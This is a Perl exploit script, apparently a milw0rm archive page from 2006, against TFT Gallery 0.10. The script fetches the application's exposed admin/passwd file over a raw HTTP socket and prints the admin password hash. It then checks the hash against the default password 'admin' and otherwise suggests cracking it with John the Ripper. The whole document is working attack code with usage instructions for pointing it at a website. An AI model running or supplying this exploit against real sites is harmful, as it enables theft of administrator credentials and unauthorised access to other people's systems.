<html><head><title>TFT Gallery <= 0.10 [Password Disclosure] Remote Exploit</title></head><pre>#!/usr/bin/perl

###############################################################################
#Copyright (C) undefined1_
#
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; either version 2
#of the License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
###############################################################################

use strict; 
use IO::Socket;

$| = 1;
printf &quot;:: tftgallery 0.10 exploit - by undefined1_ @ bash-x.net/undef/ ::\n\n\n&quot;;


my $website = shift || usage();

my $path = &quot;/&quot;;
my $site = $website;
if(index($website, &quot;/&quot;) != -1)
{
	my $index = index($website, &quot;/&quot;);
	$path = substr($website, $index);
	$site = substr($website, 0, $index);
	if(substr($path, length($path)-1) ne &quot;/&quot;)
	{
		$path .= &quot;/&quot;;
	}
}


my $eop = &quot;\r\nHost: $site\r\n&quot;;
$eop .= &quot;User-Agent: Mozilla/5.0\r\n&quot;;
$eop .= &quot;Connection: close\r\n\r\n&quot;;


my $packet1 = &quot;GET &quot;.$path.&quot;admin/passwd HTTP/1.1&quot;;
my $data = sendpacket($site, $packet1.$eop);

if($data !~ /HTTP\/1.1 200 OK/)
{
	die &quot;failed to retrieve the admin password\n&quot;;
}

my $password = &quot;&quot;;
if (index($data, &quot;\r\n\r\n&quot;) != -1)
{
	$password = substr($data, index($data, &quot;\r\n\r\n&quot;)+4);
	chomp $password;
}
else
{
	die &quot;failed to retrieve the admin password\n&quot;;
}

print &quot;The password hash is: '$password'\n&quot;;
if(crypt(&quot;admin&quot;,&quot;tftgallery&quot;) eq $password)
{
	print &quot;The plaintext password is: 'admin'\n&quot;;		
}
else
{
	die &quot;Use john the ripper, luke!\n&quot;;
}




sub sendpacket(\$,\$) {
	my $server = shift;
	my $request = shift;

	my $sock = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $server, PeerPort =&gt; &quot;80&quot;) or die &quot;[-] Could not connect to $server:80 $!\n&quot;;
	print $sock &quot;$request&quot;;

	
	my $data = &quot;&quot;;
	my $answer;
	while($answer = &lt;$sock&gt;)
	{
		$data .= $answer;
	}
	
	close($sock);
	return $data;
}

sub usage() {
	printf &quot;usage: %s &lt;website&gt; [password]\n&quot;, $0;
	printf &quot;ex. : %s www.site.com/tftgallery/\n&quot;, $0;
	exit;
}

# milw0rm.com [2006-03-25]</pre></html>